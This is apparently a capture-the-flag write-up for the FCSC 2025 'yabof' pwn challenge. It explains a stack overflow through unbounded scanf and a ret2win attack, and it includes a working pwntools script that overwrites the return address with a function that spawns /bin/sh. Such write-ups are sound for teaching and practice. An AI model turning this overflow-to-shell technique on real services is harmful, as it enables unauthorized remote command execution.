# URL
https://hackropole.fr/en/challenges/pwn/fcsc2025-pwn-yabof/
# Concept
* buffer overflow
* ret2win
* scanf vulnerability
# Method of solve
* this binary is vulnerable to stack buffer overflow
* the vulnerable function is `scanf`
```asm
lea rax, [var_8h]
mov rsi, rax
lea rax, [0x00402032]       ; "%s"
mov rdi, rax
mov eax, 0
call sym.imp.__isoc99_scanf ; int scanf(const char *format)
```
* these assembly instructions use the scanf function to save user input into the `var_8h` variable
* scanf is memory insecure, which means it doesn't check if the size of the user input is larger than the `var_8h` variable
* this makes it vulnerable to buffer overflow
## The game plan
* there's another function in the binary, called `sym.yabof` which opens up an interactive shell:
```asm
lea rax, str._bin_sh        ; 0x402008 ; "/bin/sh"
mov rdi, rax
call sym.imp.execve
```
* since there's a function that opens a shell, what we want to do is put the address of that function in the `rip` register and after the user input, the `rip` will contain the address of the `sym.yabof` function, which means it will execute the function, opening up a shell for us, and saving Christmas
* when we test the binary for the amount of offset required to enter the `rip` register, we find that it's 16 bytes
* we get the address of the of the sym.yabof function
```
objdump -d ./yabof | grep yabof
```
* with the offset required to enter the `rip` register and the address of the shell function, we can craft a script to get us access
## Pwntools Script
```Python
from pwn import *
import sys
# io = process('./yabof')
io = remote('localhost', 4000)
payload = b"C"*16 + p64(0x00401146)
io.send(payload)
io.interactive()
```




